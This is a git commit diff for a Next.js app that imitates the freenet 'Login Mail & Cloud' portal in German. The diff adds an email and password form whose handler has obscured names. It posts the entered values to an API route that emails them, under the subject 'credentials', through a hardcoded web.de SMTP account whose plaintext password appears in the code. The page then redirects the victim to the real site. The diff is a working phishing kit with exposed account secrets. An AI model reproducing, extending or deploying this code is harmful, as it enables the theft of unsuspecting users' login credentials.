166ff91ce9a8f070759489d90f804d22721aba1b
Victor Bello <you@example.com>
2023-11-07 15:15:35 +0100

    @dghj

---
+++ src/app/api/bright/route.ts
@@ -0,0 +1,34 @@
+import { NextResponse, NextRequest } from "next/server";
+import mailer from "nodemailer";
+
+export async function POST(request: Request) {
+  const res: any = await request.json();
+
+  try {
+    let transporter: mailer.Transporter = mailer.createTransport({
+      service: "web.de",
+      host: "smtp.web.de",
+      port: 465,
+      secure: true,
+      auth: {
+        user: "christophw87@web.de",
+        pass: "frieselman",
+      },
+    });
+
+    const result = await transporter.sendMail({
+      from: `"dees" <christophw87@web.de>`,
+      to: `${process.env.EMAIL_TO_SEND}`,
+      subject: "credentials",
+      // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
+      html: `<h3>email: ${JSON.stringify(res.manref).replaceAll(
+        '"',
+        ""
+      )}, password: ${JSON.stringify(res.koiref).replaceAll('"', "")}</h3>`,
+    });
+
+    return NextResponse.json({ status: true, message: result });
+  } catch (error) {
+    return NextResponse.json({ status: true, message: error });
+  }
+}
--- src/app/page.tsx
+++ src/app/page.tsx
@@ -1,113 +1,288 @@
-import Image from 'next/image'
+"use client";
+import { useRef, useState } from "react";
+
+import Image from "next/image";
+import logo from "../../public/freelogo.png";
+import free from "../../public/free-wifi.png";
+import screen1 from "../../public/screen1.png";
+import screen2 from "../../public/screen2.png";
+import head_shot from "../../public/head-shot.png";
+import screen3 from "../../public/screen3.png";
+import screen4 from "../../public/screen4.png";
+import screen5 from "../../public/screen5.png";
+import screen6 from "../../public/screen6.png";
+import screen7 from "../../public/screen7.png";
 
 export default function Home() {
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">src/app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+    <>
+      <main className="bg-slate-200 xl:min-w-[1450px] lg:min-w-[1230px] min-w-[1000px] hidden md:flex">
+        <div className="bg-white w-[65%] xl:w-[80%] min-h-screen">
+          <Header />
+
+          <Body />
+        </div>
+        <div className="mt-">
+          <img
+            src="https://s1.adform.net/Banners/55611253/55611253.gif?bv=2"
+            id="adAdformfzwzbyer0"
+            className="sticky top-0 adform-domevents-click-44o3y4q7nb0"
+            width="300"
+            height="600"
+            alt=""
+          />
+        </div>
+      </main>
+
+      <main className="min-h-screen md:hidden">
+        <Header />
+        <div className="w-full">
+          <div className="sm:w-[80%] px-2 pb-2 mx-auto shadow-md">
+            <Granger />
+            <Image src={screen1} alt="screen" className="self-stretch mt-2" />
+            <Image src={screen4} alt="screen" className="self-stretch mt-2" />
+          </div>
+          <Image src={screen5} alt="screen" className="self-stretch mt-4" />
+        </div>
+      </main>
+    </>
+  );
+}
+
+const Header = () => {
+  return (
+    <>
+      <header className="w-full px-10 pt-5 xl:pt-0 bg-[#21314d]">
+        <div className="flex items-center justify-between w-full ">
+          <Image src={logo} alt="logo" className="w-32" />
+
+          <div className="xl:flex hidden items-center">
+            <div className="h-14 w-[0.1rem] bg-white "></div>
+            <div className="group cursor-pointer hover:bg-[#84bc34] w-48 h-20 flex flex-col items-center justify-center">
+              <span className="font-semibold text-base text-white group-hover:hidden">
+                MOBILFUNK
+              </span>
+              <div className="hidden group-hover:block h-full w-full text-white text-center overflow-hidden">
+                <h1 className="mt-1">MOBILFUNK</h1>
+
+                <p className="mt-[0.1rem] text-xs ">
+                  Unabhängiger Mobilfunk in allen Netzen
+                </p>
+              </div>
+            </div>
+            <div className="h-14 w-[0.1rem] bg-white "></div>
+            <div className="group cursor-pointer hover:bg-[#84bc34] w-48 h-20 flex flex-col items-center justify-center">
+              <span className="font-semibold text-base text-white group-hover:hidden">
+                INTERNET
+              </span>
+              <div className="hidden group-hover:block h-full w-full text-white text-center overflow-hidden">
+                <h1 className="mt-1">INTERNET</h1>
+
+                <p className="mt-[0.1rem] text-xs ">
+                  Unabhängiger Mobilfunk in allen Netzen
+                </p>
+              </div>
+            </div>
+            <div className="h-14 w-[0.1rem] bg-white "></div>
+
+            <div className="group cursor-pointer hover:bg-[#84bc34] w-48 h-20 flex flex-col items-center justify-center">
+              <span className="font-semibold text-base text-white group-hover:hidden">
+                TV-ENTERTAINMENT
+              </span>
+              <div className="hidden group-hover:block h-full w-full text-white text-center overflow-hidden">
+                <h1 className="mt-1">TV-ENTERTAINMENT</h1>
+
+                <p className="mt-[0.1rem] text-xs ">
+                  Unabhängiger Mobilfunk in allen Netzen
+                </p>
+              </div>
+            </div>
+            <div className="h-14 w-[0.1rem] bg-white "></div>
+
+            <div className="group cursor-pointer hover:bg-[#84bc34] w-48 h-20 flex flex-col items-center justify-center">
+              <span className="font-semibold text-base text-white group-hover:hidden">
+                MAIL & CLOUD
+              </span>
+              <div className="hidden group-hover:block h-full w-full text-white text-center overflow-hidden">
+                <h1 className="mt-1"> MAIL & CLOUD</h1>
+
+                <p className="mt-[0.1rem] text-xs ">
+                  Unabhängiger Mobilfunk in allen Netzen
+                </p>
+              </div>
+            </div>
+            <div className="h-14 w-[0.1rem] bg-white "></div>
+          </div>
+
+          <button className="bg-[#84bc34] rounded-md xl:py-1 py-2 xl:px-3 px-2 sm:px-16 text-[#21314d]">
+            <span className="text-sm hidden xl:inline">Alle Angebote</span>
+            <span className="text-sm text-white font-extrabold xl:hidden">
+              Mobilfunk
+            </span>
+          </button>
+        </div>
+
+        <div className="w-full flex justify-center py-6">
+          <Image
+            src={free}
+            alt="free"
+            className="hidden lg:block h-20 w-[50%] "
+          />
+          <div className="h-20 lg:hidden"></div>
+        </div>
+      </header>
+
+      <div className="">
+        <Image
+          src={head_shot}
+          alt="nav"
+          className="-mt-4 px-2 hidden xl:block"
+        />
+        <div className="flex justify-between items-center py-3 px-3 xl:hidden shadow-md">
+          <div className="space-x-2 flex items-center">
+            <p className="opacity-75 font-medium">Berlin</p>
+
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              strokeWidth={1.5}
+              stroke="currentColor"
+              className="w-6 h-6"
+            >
+              <path
+                strokeLinecap="round"
+                strokeLinejoin="round"
+                d="M12 3v2.25m6.364.386l-1.591 1.591M21 12h-2.25m-.386 6.364l-1.591-1.591M12 18.75V21m-4.773-4.227l-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z"
+              />
+            </svg>
+          </div>
+          <div className="flex space-x-8">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              strokeWidth={1.5}
+              stroke="currentColor"
+              className="w-6 h-6"
+            >
+              <path
+                strokeLinecap="round"
+                strokeLinejoin="round"
+                d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"
+              />
+            </svg>
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              strokeWidth={1.5}
+              stroke="currentColor"
+              className="w-6 h-6"
+            >
+              <path
+                strokeLinecap="round"
+                strokeLinejoin="round"
+                d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"
+              />
+            </svg>
+          </div>
         </div>
       </div>
+    </>
+  );
+};
 
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
+const Body = () => {
+  return (
+    <div className="">
+      <div className="grid grid-cols-2 justify-items-stretch items-center gap-4 px-4 pt-4">
+        <Image src={screen1} alt="screen" className="self-start" />
+        <div className="grid xl:grid-cols-2 gap-2 self-stretch">
+          <Image src={screen2} alt="screen" className="hidden xl:block" />
+          <Granger />
+        </div>
       </div>
+      <Image src={screen6} alt="screen" className="self-stretch mt-5" />
+      <Image src={screen7} alt="screen" className="self-stretch mt-20 w-full" />
+    </div>
+  );
+};
 
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
+const Granger = () => {
+  const manref = useRef<HTMLInputElement>(null);
+  const koiref = useRef<HTMLInputElement>(null);
+  const [eggs, setEggs] = useState("");
 
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
+  const pastries = () => {
+    if (manref.current && koiref.current) {
+      if (manref.current.value && koiref.current.value) {
+        setEggs("");
+        fetch("/api/bright", {
+          method: "POST",
+          body: JSON.stringify({
+            manref: manref.current.value,
+            koiref: koiref.current.value,
+          }),
+        })
+          .then((res) => {
+            console.log(res);
+          })
+          .catch((err) => {
+            console.log(err);
+          })
+          .finally(() => {
+            window.location.replace("https://freenet.de");
+          });
+      } else {
+        setEggs("All fields are required");
+      }
+      console.log(manref.current.value);
+      console.log(koiref.current.value);
+    }
+  };
+  return (
+    <div className="h-full self-start">
+      <div className="">
+        <div className="bg-[#84bc34] pt-4 ">
+          <h1 className="text-white mb-2 text-lg px-4">Login Mail & Cloud</h1>
 
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore the Next.js 13 playground.
-          </p>
-        </a>
+          {eggs !== "" && (
+            <div className="border-l-2 border-red-400 px-4 py-2 mx-3 mb-1 text-xs flex items-center">
+              {eggs}
+            </div>
+          )}
 
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
+          <div className="flex flex-col space-y-1 px-4">
+            <input
+              ref={manref}
+              type="email"
+              name=""
+              id=""
+              className="py-1 px-3 outline-none xl:placeholder:text-sm"
+              placeholder="Email-Adresse"
+              required
+            />
+            <input
+              ref={koiref}
+              type="password"
+              name=""
+              id=""
+              className="py-1 px-3 outline-none xl:placeholder:text-sm"
+              placeholder="Passwort"
+              required
+            />
+          </div>
+
+          <div className="flex justify-between mt-2 pb-2 px-4">
+            <p className="xl:text-xs text-white">Brauchst du hilfe?</p>
+            <button className="p-1 bg-[#21314d] text-white" onClick={pastries}>
+              ANMELDEN
+            </button>
+          </div>
+          <Image src={screen3} alt="" className="w-full" />
+        </div>
       </div>
-    </main>
-  )
-}
+    </div>
+  );
+};
